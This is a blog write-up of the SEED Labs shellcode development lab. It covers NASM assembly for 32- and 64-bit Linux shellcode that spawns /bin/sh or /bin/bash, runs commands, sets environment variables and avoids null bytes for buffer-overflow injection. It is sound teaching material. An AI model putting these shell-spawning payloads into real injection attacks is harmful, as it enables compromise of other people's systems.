---
title: 【Seed-Labs 2.0】Shellcode Development Lab
tags:
  - Shellcode
  - Assembly
  - Seed-Labs
  - Binary Security
categories:
  - Security
mathjax: true
abbrlink: 1ad5be0d
date: 2025-11-11 13:25:44
description: Seed-Labs 2.0 Shellcode开发实验室，学习汇编语言和二进制安全
cover: https://potatojiang.oss-cn-chengdu.aliyuncs.com/blog_cover_21.png
---

## 【Seed-Labs 2.0】Shellcode Development Lab


**实验环境**
虚拟机环境：SEED-labs-ubuntu 20.04
使用软件：Oracle VM VirtualBox7.1.0

**实验概述**
Shellcode 广泛用于许多涉及代码注入的攻击中。本实验的目的是帮助学生了解这些技术，以便他们能编写自己的 shellcode。编写 shellcode 有几个难点，一是要确保二进制中没有零，二是要找出命令中使用的数据地址。

第一个挑战并不难解决，而且有多种解决方法。第二个难题的解决方案导致了两种典型的 shellcode 编写方法。一种方法是在执行过程中将数据推入堆栈，因此可以从堆栈指针中获取它们的地址。在第二种方法中，数据存储在代码区，紧随调用指令之后。执行调用指令时，数据地址被视为返回地址，并被推入堆栈。这两种解决方案都非常优雅，希望同学们能学会这两种技术。本实验包括以下内容：

Shellcode
Assembly code
Disassembling

### TASK1: Writing Shellcode

在本任务中，我们将首先从 shellcode 示例开始，演示如何编写 shellcode。在之后的任务中我们会通过修改 shellcode 来完成各种任务。

Shellcode 通常使用汇编语言编写，汇编语言取决于计算机体系结构。我们将使用英特尔架构，它有两种类型的处理器：x86（32 位 CPU）和 x64（64 位 CPU）。在本任务中，我们将重点关注 32 位 shellcode。在最后一项任务中，我们将切换到 64 位 shellcode。尽管现在大多数计算机都是 64 位计算机，但它们仍可运行 32 位程序。

本节共有四个小任务

a：The Entire Process
b：Eliminating Zeros from the Code
c：Providing Arguments for System Calls
d：Providing Environment Variables for execve()
**补充： C语言的编译过程**
可参考这篇文章详细学习C语言的编译过程 The Four Stages of Compiling a C Program

编译 C 程序是一个多阶段的过程，可以分为四个主要阶段：
预处理 (Preprocessing)、编译 (Compilation)、汇编 (Assembly) 和链接 (Linking)。

![image-20251111162001012](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005304.png)

**1.预处理（Preprocessing）**
在这个阶段，以 # 开头的行被预处理器 (Preprocessor) 解释为命令。这些命令用于减少代码重复，例如引入文件 (Include Files)、定义宏 (Define Macros) 和条件性地省略代码。在处理命令之前，预处理器会连接续行并剥离注释。

**2.编译（Compilation）**
编译阶段将预处理后的代码转换为特定于目标处理器架构 (Target Processor Architecture) 的汇编指令 (Assembly Instructions)。此阶段的输出是人类可读的中间语言 (Intermediate Language)。

**3.汇编（Assembly）**
在这一阶段，汇编器 (Assembler) 将汇编指令转换为目标代码 (Object Code)。生成的输出是处理器能够执行的实际指令。

**4.链接（Linking）**
链接阶段将汇编生成的目标代码合并成最终的可执行程序 (Executable Program)。链接器 (Linker) 会重新排列现有的对象代码，确保程序中的函数调用能够成功，并添加库函数 (Library Functions) 的代码。

Task 1.a: The Entire Process
在本任务中，我们提供了一个基本的 x86 shellcode 文件 mysh.s，作为示例文件用以演示如何从头开始编写 shellcode。mysh.s 代码如下所示。

    section .text
      global _start
        _start:
          ; Store the argument string on stack
          xor  eax, eax 
          push eax          ; Use 0 to terminate the string
          push "//sh"
          push "/bin"
          mov  ebx, esp     ; Get the string address
    
          ; Construct the argument array argv[]
          push eax          ; argv[1] = 0
          push ebx          ; argv[0] points "/bin//sh"
          mov  ecx, esp     ; Get the address of argv[]
       
          ; For environment variable 
          xor  edx, edx     ; No env variables 
    
          ; Invoke execve()
          xor  eax, eax     ; eax = 0x00000000
          mov   al, 0x0b    ; eax = 0x0000000b
          int 0x80

**Compiling to object code**. 我们使用 nasm 编译上述汇编代码 (mysh.s)，它是英特尔 x86 和 x64 架构的汇编器和反汇编器。-f elf32 选项表示我们要将代码编译为 32 位 ELF 二进制格式。可执行和可链接格式（ELF）是可执行文件、目标代码、共享库的通用标准文件格式。对于 64 位汇编代码，应使用 elf64。

```
$ nasm -f elf32 mysh.s -o mysh.o
```

**Linking to generate final binary**. 得到目标代码 mysh.o 后，如果想生成可执行的二进制文件，可以运行链接程序 ld，这是编译的最后一步。-m elf i386 选项表示生成 32 位 ELF 二进制文件。完成这一步后，我们就能得到最终的可执行代码 mysh。如果运行它，我们就能得到一个 shell。在运行 mysh 之前和之后，我们使用 echo $$ 打印出当前 shell 的进程 ID，因此我们可以清楚地看到 mysh 确实启动了一个新的 shell。

![image-20251111162552177](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005193.png)

**Getting the machine code**. 在攻击过程中，我们只需要 shellcode 的机器代码，而不需要包含实际机器代码以外数据的独立可执行文件。从技术上讲，只有机器代码才被称为 shellcode。因此，我们需要从可执行文件或目标文件中提取机器代码。有多种方法可以做到这一点。一种方法是使用 objdump 命令反汇编可执行文件或对象文件。 

汇编代码有两种不同的常用语法模式，一种是 AT&T 语法模式，另一种是 Intel 语法模式。默认情况下，objdump 使用 AT&T 模式。在下文中，我们使用 -Mintel 选项，以英特尔模式生成汇编代码。

![image-20251111165027867](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005242.png)

在上述打印输出中，红色框出的数字是机器代码。可以使用 xxd 命令打印出二进制文件的内容，这样就能从打印输出中找出 shellcode 的机器码。

![image-20251111165129170](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005446.png)

在攻击代码中使用 shellcode。在实际攻击中，我们需要在攻击代码（如 Python 或 C 程序）中加入 shellcode。我们通常会将机器码存储在数组中，但如果手动将上面打印的机器码转换为 Python 和 C 程序中的数组赋值，则会相当繁琐，尤其是当我们需要在实验室中多次执行这一过程时。我们编写了以下 convert.py 帮助这一过程。只需复制从 xxd 命令中得到的内容（只包括 shellcode 部分），然后替换掉下面的代码红色框中得内容。

![image-20251111165510789](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005369.png)

运行 convert.py 程序将打印出以下 Python 代码，您可以将其加入攻击代码中。它将 shellcode 保存在一个 Python 数组中。

![image-20251111165459485](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005408.png)

### Task 1.b. Eliminating Zeros from the Code

Shellcode 广泛用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制（如 strcpy() 函数）引起的。在这些字符串复制函数中，0 被视为字符串的结尾。因此，如果我们在 shellcode 中间有一个零，字符串复制将无法从该 shellcode 复制零之后的内容到目标缓冲区，因此攻击将无法成功。

虽然并非所有漏洞都是零的问题，但在 shellcode 中要求机器代码中不能有任何零；否则，shellcode 的应用将受到限制。

**任务**： shellcode中，push的字符串是"/bin//sh"，其本应该是"/bin/sh"，但是因为在32位程序中，需要4byte对齐，所以将/sh改为//sh。任务要求使用/bin/bash，不允许添加多余的/进行调用，且shellcode中不允许出现0。

1.按照倒序对/bin/bash和4 bytes对齐进行入栈，则顺序为h，/bas，/bin，最后的h显然不够4 bytes，高位会补0，但我们不希望出现0，所以直接对al赋值即可。完整代码如下。

```
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax
      push eax          ; Use 0 to terminate the string
      xor eax, eax
      mov al, "h"
      push eax
      xor eax, eax
      push "/bas"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
```

2.修改后，运行得到下面的结果，即修改成功。

![image-20251111170121002](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133007056.png)

### **Task 1.c. Providing Arguments for System Calls**

任务内容： 在这项任务中，我们需要运行以下命令，即使用 execve 执行以下命令，该命令使用 /bin/sh 执行 “ls -la ”命令。

```
/bin/sh -c "ls -la"
```

**任务分析**： 从C语言看，execve函数的原型为

```
int execve(const char *filename, char *const argv[], char *const envp[]);
```

- 第一个参数filename是字符串代表的文件路径。
- 第二个参数argv[]是数组指针，数组中每个元素是一个指针，指向一个参数，且最后一个元素为NULL，表示数组结束。
- 最后一个参数envp[]是传递给执行文件的新环境变量数组。

所以在这条新命令中，argv 数组需要构造参数下面的参数数组，应包含以下四个元素。

argv[3] = 0
argv[2] = "ls -la"
argv[1] = "-c"
argv[0] = "/bin/sh"
1.将构造的参数压入栈中，这里的”-c”和”la”都是16位，所以直接对16位寄存器ax赋值即可。

参数ls -la构造如下，然后压入栈中。此时将栈顶指针地址移动到ecx寄存器，表示该参数其地址存储在ecx。

```
xor eax, eax
mov ax, "la"
push eax
push "ls -"
mov edx, esp
```

参数-c构造如下，然后压入栈中。此时将栈顶指针地址移动到edx寄存器，表示该参数其地址存储在edx。

```
xor eax, eax
mov ax, "-c"
push eax
mov ecx, esp
```

参数/bin//sh构造如下，然后压入栈中。此时将栈顶指针地址移动到ebx寄存器，表示该参数其地址存储在ebx

```
xor eax, eax
push eax
push "//sh"
push "/bin"
mov  ebx, esp     ; Get the string address
```

2.将args参数列表压入栈中，然后将栈顶指针esp移动到ecx寄存器作为系统调用第二个参数，这样args参数传递就完成了。同时args[0]即path参数的地址已经在ebx寄存器中，这个参数地址在我们之前构造时就已经放在了ebx寄存器中了，因此path参数的传递也完成了。

```
push eax          ; argv[3] = 0
push edx          ; argv[2] points "ls -la"
push ecx          ; argv[1] points "-c"
push ebx          ; argv[0] points "/bin//sh"
mov  ecx, esp     ; Get the address of argv[]
```

3.完整代码如下：

    section .text
      global _start
        _start:
          ; Store the argument string on stack
       
          xor eax, eax
          mov ax, "la"
          push eax
          push "ls -"
          mov edx, esp
    
          xor eax, eax
          mov ax, "-c"
          push eax
          mov ecx, esp
    
          xor eax, eax
          push eax
          push "//sh"
          push "/bin"
          mov  ebx, esp     ; Get the string address
    
          ; Construct the argument array argv[]
          push eax          ; argv[3] = 0
          push edx          ; argv[2] points "ls -la"
          push ecx          ; argv[1] points "-c"
          push ebx          ; argv[0] points "/bin//sh"
          mov  ecx, esp     ; Get the address of argv[]
       
          ; For environment variable 
          xor  edx, edx     ; No env variables 
    
          ; Invoke execve()
          xor  eax, eax     ; eax = 0x00000000
          mov   al, 0x0b    ; eax = 0x0000000b
          int 0x80

4.最后编译链接shellcode，执行结果如下

![image-20251111170710336](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133007687.png)

### **Task 1.d. Providing Environment Variables for execve()**

**任务内容**： 我们将编写一个名为 myenv.s 的 shellcode。当这个程序被执行时，它会执行“/usr/bin/env ”命令，可以打印出以下环境变量：

```
$ ./myenv
aaa=1234
bbb=5678
cccc=1234
```

**任务分析**： 环境变量 cccc 的值必须正好是 4 字节（尾部不允许添加空格）。我们故意使该环境变量字符串（名称和值）的长度不是 4 的倍数。要编写这样的 shellcode，我们需要在堆栈上构建一个环境变量数组，并在调用 execve() 之前将该数组的地址存储到 edx 寄存器中。在堆栈上构造这个数组的方法与我们构造 argv[] 数组的方法完全相同。每个元素为指向环境变量的指针，每个环境变量的形式是name=value形式的字符串，字符串的结尾是0，env[]数组的最后一个元素为0。

```
env[3] = 0 // 0 marks the end of the array
env[2] = address to the "cccc=1234" string
env[1] = address to the "bbb=5678" string
env[0] = address to the "aaa=1234" string
```

1.首先构建env[]数组，每个元素为指向环境变量的指针，每个环境变量的形式是name=value形式的字符串，字符串的结尾是0，env[]数组的最后一个元素为0。

```
env[3] = 0
env[2] = address to the "cccc=1234" string
env[1] = address to the "bbb=5678" string
env[0] = address to the "aaa=1234" string
```

2.完整代码如下：

```
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      xor eax, eax
      mov al, "4"
      push eax
      push "=123"
      push "cccc"
      mov ebx, esp

      xor eax, eax
      push eax
      push "5678"
      push "bbb="
      mov edx, esp
     
      push eax
      push "1234"
      push "aaa="
      mov ecx, esp

      ; For environment variable 
      push eax
      push ebx
      push edx
      push ecx
      mov edx, esp

      push eax
      push "/env"
      push "/bin"
      push "/usr"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/usr/bin/env"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80

```

6.重新编译运行后的结果如下：

![image-20251111170945267](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133010329.png)

### Task 2: Using Code Segment

我们可以从任务 1 中的 shellcode 看到，它解决数据地址问题的方法是在堆栈上动态构建所有必要的数据结构，这样就可以从堆栈指针 esp 中获取它们的地址。

还有另一种方法可以解决同样的问题，即获取所有必要数据结构的地址。在这种方法中，数据存储在代码区中，其地址通过函数调用机制获取。让我们看看下面的代码。

上面的代码首先跳转到位置 2 的指令，然后执行另一次跳转（跳转到位置 1），但这次使用的是调用指令。这条指令用于函数调用，即在跳转到目标位置之前，先记录下一条指令的地址作为返回地址，这样当函数返回时，就可以返回到调用指令之后的指令。

在本例中，调用指令后的 “指令”（第 ➋ 行）实际上不是指令，而是存储字符串的指令。不过，这并不重要，调用指令会将其地址（即字符串的地址）推入堆栈，即函数帧的返回地址字段。当我们进入函数时，即跳转到位置 1 后，栈顶就是存储返回地址的地方。因此，第➊行的 pop ebx 指令实际上是获取第➋行的字符串地址，并将其保存到 ebx 寄存器中。这就是字符串地址的获取方式。

第 ➋ 行的字符串并不是一个完整的字符串，它只是一个占位符。程序需要在这个占位符中构建所需的数据结构。既然已经获得了字符串的地址，那么在这个占位符内构建的所有数据结构的地址都可以很容易地推导出来。

如果我们想获得可执行文件，就需要在运行链接程序 (ld) 时使用 --omagic 选项，这样代码段才是可写的。默认情况下，代码段是不可写的。程序运行时，需要修改代码段中存储的数据；如果代码段不可写，程序就会崩溃。这对实际攻击来说不是问题，因为在攻击中，代码通常被注入到可写数据段（如堆栈或堆）中。我们通常不会将 shellcode 作为独立程序运行。

```
$ nasm -f elf32 mysh2.s -o mysh2.o
$ ld --omagic -m elf_i386 mysh2.o -o mysh2
```

**任务**： 您需要完成以下工作：（1）请从标有 1 的一行开始，详细解释 mysh2.s 中的每一行代码。(2) 请使用 mysh2.s 中的技术实现一个新的 shellcode，使其执行 /usr/bin/env，并打印出以下环境变量：

```
a=11
b=22
```

**任务一**：详细解释 mysh2.s 中的代码：

```
section .text
global _start
_start:
    BITS 32
    jmp short two
one:
    pop ebx  ; 从栈中弹出一个值到 ebx
    xor eax, eax  ; 将 eax 置为 0
    mov [ebx+7], al  ; 将 0x00 保存到 ebx + 7 的内存地址
    mov [ebx+8], ebx  ; 将 ebx 的值保存到 ebx + 8 的内存地址
    mov [ebx+12], eax  ; 将 0 保存到 ebx + 12 的内存地址
    lea ecx, [ebx+8]  ; 将 ebx + 8 的地址存入 ecx
    xor edx, edx  ; 将 edx 置为 0
    mov al, 0x0b  ; 设置系统调用号为 execve
    int 0x80  ; 触发中断，调用系统
two:
    call one  ; 调用 one 标签的代码
    db '/bin/sh*AAAABBBB'  ; 定义字符串及填充数据*
```

```
section .text: 定义代码段，表示接下来的内容是可执行代码。
global _start: 声明 _start 为全局符号，操作系统会从这里开始执行程序。
_start: 入口点，程序开始执行的地方。
BITS 32: 指明接下来的代码是为 32 位处理器编写的。
jmp short two: 无条件跳转到 two 标签。该指令会直接跳过 one 标签的代码。
one:标签 one 的开始，后面的代码会被 call one 调用。
pop ebx:从栈顶弹出一个值到寄存器 ebx。这个值通常是指向字符串的地址，程序执行时会将该值放入栈中。
xor eax, eax: 将 eax 寄存器的值置为 0。这里用于清空 eax，为后续操作做准备。
mov [ebx+7], al:将 al 寄存器中的值（此时是 0）存储到 ebx + 7 的内存地址。此操作在字符串 ‘/bin/sh’ 的后面添加一个空字符（0x00），标识字符串的结束。
mov [ebx+8], ebx:将 ebx 的值（指向 ‘/bin/sh’ 的地址）存储到 ebx + 8 的内存地址。这个地址将作为 argv（命令行参数数组）的位置。
mov [ebx+12], eax: 将 eax（此时是 0）存储到 ebx + 12 的内存地址。这表示没有环境变量（envp）。
lea ecx, [ebx+8]:将 ebx + 8 的地址加载到 ecx。这将是指向参数数组的地址。
xor edx, edx: 将 edx 寄存器清零，表示没有环境变量。
mov al, 0x0b: 将 0x0b（对应于 execve 系统调用的调用号）放入 al 寄存器，准备进行系统调用。
int 0x80: 触发中断，调用操作系统的服务。此处将会执行 execve 系统调用，启动新的进程 /bin/sh。
two:标签 two 的开始。
call one: 调用 one 标签的代码，执行其中的指令，准备参数并进行系统调用。
db '/bin/sh*AAAABBBB':定义字符串 ‘/bin/sh’，后面的 *AAAABBBB 用于填充和对齐内存，以确保数据的正确性。db 是定义字节的伪指令。
```

**任务二**： 实现一个 shellcode，使其执行 /usr/bin/env，并打印出环境变量。

1.首先，我们需要构造三个参数

```
filename = "/usr/bin/env"
argv[] = {"/usr/bin/env", NULL}
env[] = {address to "a=11", address to "b=22", NULL}
```

2.参考mysh2.s，定义数据应该为db '/usr/bin/env*NNNNDDDDa=11*b=22*AAAABBBBNNNN'
注：* 代表后续应该用1 byte的0替代的位置，表示字符串的结尾。NNNN表示4 bytes的0需要替代的位置，表示数组中的NULL，AAAA和BBBB分别表示a=11和b=22的地址

3.完整代码如下所示：

	section .text
	  global _start
	    _start:
		BITS 32
		jmp short two
	    one:
	 	pop ebx ;command address
	 	xor eax, eax
	 	mov [ebx+12], al ;string 0 terminal
		mov [ebx+13], ebx
	
		mov [ebx+17], eax ;argv[1] = 0
		lea ecx, [ebx+13] ;argv[]
	
	  	mov [ebx+25], al
	 	mov [ebx+30], al
		lea edx, [ebx+21] ;points 'a=11'
		mov [ebx+31], edx
		lea edx, [ebx+26] ;points 'b=22'
		mov [ebx+35], edx
		mov [ebx+39], eax
		lea edx, [ebx+31]
	
	 	;xor edx, edx
		;lea edx, [ebx+13]
	 	mov al,  0x0b
	 	int 0x80
	     two:
	 	call one
		;   0   4   8   23   7   1   56   01   5   9
	 	db '/usr/bin/env*NNNNDDDDa=11*b=22*AAAABBBBNNNN'

4.编译运行结果如下

![image-20251111172827972](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133011116.png)

### Task 3: Writing 64-bit Shellcode

编写 64 位 shellcode ，与编写 32 位 shellcode 相似；区别主要在于寄存器。在 x64 架构中，调用系统调用是通过 syscall 指令完成的，系统调用的前三个参数分别存储在 rdx、rsi 和 rdi 寄存器中。下面是一个 64 位 shellcode 的示例：

```
section .text
global _start
	_start:
		; The following code calls execve("/bin/sh", ...)
		xor rdx, rdx ; 3rd argument (stored in rdx)
		push rdx
		mov rax,’/bin//sh’
		push rax
		mov rdi, rsp ; 1st argument (stored in rdi)
		push rdx
		push rdi
		mov rsi, rsp ; 2nd argument (stored in rsi)
		xor rax, rax
		mov al, 0x3b ; execve()
		syscall
```

我们可以使用以下命令将汇编代码编译成 64 位二进制代码：

```
$ nasm -f elf64 mysh_64.s -o mysh_64.o
$ ld mysh_64.o -o mysh_64
```

**任务内容**： 对 64 位 的 shellcode 执行“/bin/bash”，而不是“/bin/sh”，并且不允许在命令字符串中使用任何多余的“/”，即命令长度必须为 9 字节（/bin/bash）。请演示如何做到这一点。除了证明您可以得到一个 bash shell 外，您还需要证明您的代码中没有 0。

1.修改代码如下

```
section .text
  global _start
    _start:
      ; The following code calls execve("/bin/sh", ...)
      xor  rdx, rdx       ; 3rd argument
      mov al, 'h'
      push rax,
      mov rax, '/bin/bas'
      push rax
      mov rdi, rsp        ; 1st argument
      
      push rdx 
      push rdi
      mov rsi, rsp        ; 2nd argument
      xor  rax, rax
      mov al, 0x3b        ; execve()
      syscall

```

2.编译运行结果如下

![image-20251111175102884](https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133012283.png)
